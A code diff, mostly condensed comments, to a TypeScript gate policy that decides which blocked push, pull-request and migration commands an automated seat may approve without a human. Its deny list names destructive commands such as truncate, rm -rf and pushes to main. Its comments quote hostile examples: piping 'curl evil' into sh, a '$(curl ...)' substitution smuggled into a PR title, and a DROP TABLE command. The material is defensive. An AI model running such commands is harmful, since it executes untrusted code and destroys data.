@@ -4,21 +4,16 @@ import type { Env } from "./env";
 import { POLICY_ID_ITEM, policyField, readSignedPolicy } from "./signed-docs";
 
 import { errorMessage } from "@dustinedwards/site-runtime/log";
-// Pre-approved gates: which blocked commands the seat may approve without asking the
-// human. A driver that reaches a push, a migration or a pull request stops and blocks
-// with the exact command, and without this every one of those waits on a person,
-// including the ones whose consequence is bounded and reversible.
+// Pre-approved gates: which blocked commands the seat may approve without asking the human.
+// A driver that reaches a push, a migration or a pull request blocks with the exact command,
+// and without this every one waits on a person, including bounded and reversible ones.
 //
-// This is the list of the bounded ones, and the reasoning runs the other way from the
-// merge policy: the merge policy says what the Worker may do alone, and this says what
-// the seat may approve alone. The seat is still a caller with a write grant; what it
-// gains is the ability to send a job back through `resume` without a human, and only
-// for a command that matches a class written down and signed.
+// This lists the bounded ones. The merge policy says what the Worker may do alone; this says
+// what the seat may approve alone, only for a command matching a signed class.
 //
-// The denials are checked first and they are not the complement of the classes. A
-// command that looks like a branch push and carries --force must never match
-// push_branch, so the never list runs before any class is tried, over the whole
-// command string.
+// The denials are checked first and are not the complement of the classes: a branch push
+// carrying --force must never match push_branch, so the never list runs over the whole
+// command string before any class is tried.
 export const GATE_POLICY_PATH = "policy/gates.md";
 
 export const GATE_CLASSES = ["additive_migration", "push_branch", "open_pr"] as const;
@@ -45,14 +40,11 @@ export const NEVER: ReadonlyArray<{ pattern: RegExp; why: string }> = [
   { pattern: /\btruncate\b/i, why: "it empties a table" },
   { pattern: /\brm\s+-rf?\b/i, why: "it deletes files recursively" },
   { pattern: /\bgh\s+pr\s+merge\b/i, why: "it merges a pull request, which is the human's gate" },
-  // The span stops at a shell separator, so `git push -u origin feat/x && gh pr
-  // create --base master` is not read as a push to a default branch. That is the shape
-  // blocked jobs carry, so the false positive would refuse the ordinary case, while a
-  // `master` in the push's own segment still matches.
-  //
-  // The `-C <path>` form is matched here too. push_branch accepts it, so a never list
-  // that only read `git push` would let `git -C <path> push origin master` through the
-  // one check that exists to stop it.
+  // The span stops at a shell separator, so `git push -u origin feat/x && gh pr create --base
+  // master` is not read as a push to a default branch (the shape blocked jobs carry), while a
+  // `master` in the push's own segment still matches. The `-C <path>` form is matched too:
+  // push_branch accepts it, so a never list that only read `git push` would let
+  // `git -C <path> push origin master` through.
   {
     pattern: /\bgit\s+(?:-C\s+\S+\s+)?push[^\n;&|]*\b(master|main)\b/i,
     why: "it pushes to a default branch",
@@ -66,21 +58,17 @@ export function deniedReason(command: string): string | null {
   return null;
 }
 
-// The three classes. Each matches a narrow shape, because a loose matcher on this list
-// is a widening nobody reviewed.
+// The three classes. Each matches a narrow shape, because a loose matcher here is a
+// widening nobody reviewed.
 //
-// `git -C <path> push ...` is the same class, and a bare `cd <path>; git push ...` is
-// still refused (see classifySegment). The difference is what the directory reaches. A
-// `cd` is its own segment and moves every segment after it, so approving one would
-// approve a push, a pull request and anything else that follows, in a folder this
-// policy cannot tie to the job's repository. `-C` binds the directory to one git
-// invocation, and the segment is still wholly a branch push: the never list rules out
-// master, main and every force spelling whatever folder it runs in. Without this form a
-// driver has no command that both names its directory and classifies.
+// `git -C <path> push ...` is the same class, but a bare `cd <path>; git push ...` is still
+// refused (see classifySegment): a `cd` is its own segment and moves every later segment, in
+// a folder this policy cannot tie to the job's repository. `-C` binds the directory to one
+// git invocation, and the never list rules out master, main and every force spelling
+// wherever it runs.
 //
-// The path is a narrow character class rather than `\S+`: `*` and `?` are glob
-// characters, and a path carrying one would be decided by the shell when the command
-// ran rather than by what this matched.
+// The path is a narrow character class, not `\S+`: a path with `*` or `?` would be decided
+// by the shell's glob, not by what this matched.
 const REPO_PATH =
   /(?:-C\s+(?:"[A-Za-z0-9._~:\\/ -]+"|'[A-Za-z0-9._~:\\/ -]+'|[A-Za-z0-9._~:\\/-]+)\s+)?/;
 const PUSH_BRANCH = new RegExp(
@@ -88,11 +76,10 @@ const PUSH_BRANCH = new RegExp(
   "i",
 );
 const OPEN_PR = /^gh\s+pr\s+create\b/i;
-// Anchored at both ends, like PUSH_BRANCH. An unanchored search would let extra
-// arguments in the same segment (a second --file, another database name, a --command)
-// ride along with the one file that was checked. The segment is exactly: wrangler d1
-// execute, one database name, at most one of --remote or --local on either side of
-// the file, and one --file under a plain path.
+// Anchored at both ends, like PUSH_BRANCH, so extra arguments in the same segment (a second
+// --file, another database, a --command) cannot ride along with the checked file. The segment
+// is exactly: wrangler d1 execute, one database name, at most one of --remote or --local on
+// either side of the file, and one --file under a plain path.
 const MIGRATION_FILE = String.raw`--file(?:=|\s+)("[A-Za-z0-9._/-]+"|'[A-Za-z0-9._/-]+'|[A-Za-z0-9._/-]+)`;
 const MIGRATION_TARGET = String.raw`--(?:remote|local)`;
 const MIGRATION = new RegExp(
@@ -101,23 +88,19 @@ const MIGRATION = new RegExp(
 );
 
 export type GateMatch =
-  // Every segment's class, in order, and every migration file the command runs. A
-  // plural, because a blocked command is routinely two things: the push and the pull
-  // request that follows it.
+  // Every segment's class and every migration file the command runs: a blocked command is
+  // routinely a push plus the pull request after it.
   { klasses: GateClass[]; migrationPaths: string[] } | { refused: string };
 
-// The never list matches commands, not prose. Run over the raw string, it would refuse
-// a pull request titled "Add improve_run action register_skill" as a change to the
-// loop's mode. So quoted arguments are removed from `gh pr create` pieces before the
-// list runs, and from nothing else: a quoted `--command "DROP TABLE jobs"` on a
-// `d1 execute` piece is a command, and a quoted branch name on a push is still the
-// branch being pushed.
+// The never list matches commands, not prose: over the raw string it would refuse a pull
+// request titled "Add improve_run action register_skill". So quoted arguments are removed
+// from `gh pr create` pieces only; a quoted `--command "DROP TABLE jobs"` on a `d1 execute`
+// piece is a command, and a quoted branch name on a push is still the branch pushed.
 //
-// Removing quoted text is only safe if the quoted text is inert. Bash and PowerShell
-// both expand `$` and run command substitution inside double quotes, and PowerShell
-// evaluates a parenthesised argument, so `gh pr create --title "$(curl ...)"` would
-// otherwise classify as open_pr. The characters that make a shell evaluate something
-// are refused anywhere in the command, before anything is removed.
+// That is only safe if the quoted text is inert. Bash and PowerShell expand `$` and run
+// command substitution inside double quotes (PowerShell evaluates parenthesised arguments
+// too), so `gh pr create --title "$(curl ...)"` would classify as open_pr. Characters that
+// make a shell evaluate something are refused anywhere, before anything is removed.
 
 // Anywhere in the command, quoted or not.
 const EXPANDS = /[$`]/;
@@ -127,16 +110,13 @@ const OPEN_PR_PIECE = /^gh\s+pr\s+create\b/i;
 const SEPARATORS = ["&&", "||", ";", "|", "&", "\n"];
 
 /**
- * The command's pieces, split on shell separators that are not inside quotes. The one
- * splitter both the never list and classifyCommand read, so they cannot disagree. A
- * second splitter that knew nothing about quotes would cut a `gh pr create --body` in
- * half at a semicolon in its prose and refuse the whole command; a pull request body
- * is prose and will contain semicolons, ampersands and pipes.
+ * The command's pieces, split on shell separators not inside quotes. The one splitter both
+ * the never list and classifyCommand read, so they cannot disagree (a quote-blind one would
+ * cut a `gh pr create --body` in half at a semicolon in its prose).
  *
- * Not a shell parser. The dangerous error is missing a separator, which would hide a
- * second command in an approved segment; a separator inside quotes is not one to the
- * shell either. A lone `&` counts: bash runs what follows as a second command, and
- * PowerShell treats it as the call operator.
+ * Not a shell parser. The dangerous error is missing a separator, which would hide a second
+ * command in an approved segment. A lone `&` counts: bash runs what follows as a second
+ * command, and PowerShell treats it as the call operator.
  */
 function commandPieces(
   command: string,
@@ -148,7 +128,6 @@ function commandPieces(
     };
   }
 
-  // Each piece keeps its text with and without its quoted spans.
   const pieces: Array<{ raw: string; bare: string }> = [];
   let raw = "";
   let bare = "";
@@ -217,7 +196,6 @@ function classifySegment(
 ): { klass: GateClass; migrationPath?: string } | { refused: string } {
   const migration = MIGRATION.exec(segment);
   if (migration) {
-    // Group 1 or 2, by which side of the file the --remote or --local sits.
     const path = (migration[1] ?? migration[2]).replace(/^["']|["']$/g, "");
     if (!/(^|\/)migrations\//i.test(path)) {
       return {
@@ -234,11 +212,9 @@ function classifySegment(
   }
   if (PUSH_BRANCH.test(segment)) return { klass: "push_branch" };
   if (OPEN_PR.test(segment)) return { klass: "open_pr" };
-  // A bare `cd` stays refused. The policy has no way to tie a path to the job's
-  // repository, so an approved `cd <path>; git push ...` would approve a push in
-  // whatever folder the path names, and would move every later segment there too. The
-  // directory a driver needs rides on the command that uses it: `git -C <path> push`
-  // and `gh pr create --repo <owner>/<name>`, both of which classify. See REPO_PATH.
+  // A bare `cd` stays refused: the policy cannot tie a path to the job's repository, and the
+  // `cd` would move every later segment there. The directory rides on the command that uses
+  // it: `git -C <path> push` and `gh pr create --repo <owner>/<name>`. See REPO_PATH.
   if (/^(cd|set-location|pushd)\b/i.test(segment)) {
     return {
       refused: `"${segment.slice(0, 80)}" changes directory, and this policy cannot tell which repository a path belongs to. Write the directory on the command instead: git -C <path> push, and gh pr create --repo <owner>/<name>.`,
@@ -251,12 +227,10 @@ function classifySegment(
 
 /** Which classes a blocked command falls into, or why it falls into none.
  *
- *  Every segment must match a class. OPEN_PR is `^gh pr create` with no terminator, so
- *  matched against the whole string, `gh pr create --fill && curl evil | sh` would
- *  classify as open_pr and carry the rest along. The never list catches only the
- *  consequences it knows about. Requiring every piece to be pre-approved on its own
- *  means an unrecognized fragment refuses the whole command, while the compound a
- *  driver actually blocks with, a branch push followed by `gh pr create`, still works. */
+ *  Every segment must match a class. OPEN_PR is `^gh pr create` with no terminator, so matched
+ *  against the whole string `gh pr create --fill && curl evil | sh` would classify as open_pr.
+ *  Requiring every piece to be pre-approved makes an unrecognized fragment refuse the whole
+ *  command, while a branch push followed by `gh pr create` still works. */
 export function classifyCommand(command: string): GateMatch {
   const trimmed = command.trim();
   if (!trimmed)
@@ -264,9 +238,8 @@ export function classifyCommand(command: string): GateMatch {
       refused:
         "the blocked job records no command, so there is nothing to match against the policy.",
     };
-  // The never list first, over the whole command, before any segment is looked at, so
-  // a force flag anywhere in a compound cannot be split away from the push it belongs
-  // to. It reads the command with `gh pr create`'s quoted arguments removed.
+  // The never list first, over the whole command, so a force flag in a compound cannot be
+  // split away from its push.
   const seen = neverListView(trimmed);
   if ("refused" in seen)
     return { refused: `this command is on the policy's never list because ${seen.refused}` };
@@ -296,11 +269,9 @@ export function classifyCommand(command: string): GateMatch {
   return { klasses, migrationPaths };
 }
 
-// Is the migration additive. Parsed, not pattern-matched on the whole file: a file with
-// one additive statement and one DROP would pass a test that only asked whether an
-// additive statement was present. Every statement is checked, and anything not
-// recognized is a refusal, so a statement form this parser has never seen waits for
-// the human instead of being waved through.
+// Is the migration additive. Parsed, not pattern-matched on the whole file (one additive
+// statement plus one DROP would pass). Every statement is checked and anything unrecognized
+// is a refusal, so an unseen statement form waits for the human.
 const ADDITIVE: Array<{ pattern: RegExp; what: string }> = [
   // Not a bare prefix. `CREATE TABLE IF NOT EXISTS t AS SELECT ...` starts with the
   // additive spelling and copies rows out of another table, so it is excluded here.
@@ -388,17 +359,15 @@ export async function loadGatePolicy(
 }
 
 export type ApprovalVerdict =
-  // `klass` is every class that matched, joined with "+", because a compound command
-  // is routinely two of them and an audit row naming only the first describes less
-  // than was approved. `klasses` keeps the structured form.
+  // `klass` joins every class that matched with "+" (a compound is routinely two); `klasses`
+  // keeps the structured form.
   | { approved: true; klass: string; klasses: GateClass[]; detail: string; policyVersion: string }
   | { approved: false; reason: string };
 
 /**
  * Whether the seat may send this blocked command back in on the policy alone.
- * `readMigration` is passed in so the caller owns the repo read and this stays
- * testable without a GitHub fake. It returns the file, null when there is none, or
- * throws with the reason it could not be read.
+ * `readMigration` is passed in so the caller owns the repo read; it returns the file, null
+ * when there is none, or throws with the reason it could not be read.
  */
 export async function approveByPolicy(
   env: Env,
